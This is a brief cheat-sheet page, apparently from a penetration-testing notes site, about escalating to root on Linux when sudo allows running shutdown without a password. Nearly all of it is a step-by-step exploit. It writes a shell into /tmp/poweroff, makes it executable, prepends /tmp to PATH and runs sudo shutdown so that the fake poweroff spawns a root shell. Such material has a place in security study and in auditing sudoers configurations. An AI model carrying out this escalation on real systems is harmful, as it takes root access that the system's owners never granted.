# Sudo Shutdown, Poweroff Privilege Escalation



The `sudo shutdown` command might be vulnerable to privilege escalation (PrivEsc).

### Investigation <a href="#investigation" id="investigation"></a>

```shellscript
sudo -l

(ALL) NOPASS: /usr/sbin/shutdown
```

If we can execute **"shutdown"** command as root, we can gain access to privileges by overwriting the path of **"poweroff"**.

### Exploitation <a href="#exploitation" id="exploitation"></a>

First create **/tmp/poweroff** binary which invoke a shell.

```shellscript
echo /bin/sh > /tmp/poweroff
# or
echo /bin/bash > /tmp/poweroff
```

Then change permissions of the file and add **"/tmp"** folder to **PATH**.

```shellscript
chmod +x /tmp/poweroff
export PATH=/tmp:$PATH
```

Now execute **"shutdown"** as root.

```shellscript
# Some SUID command
sudo /usr/sbin/shutdown

# Then you are root user
root>
```

**/tmp/poweroff** is executed and spawn a root shell.
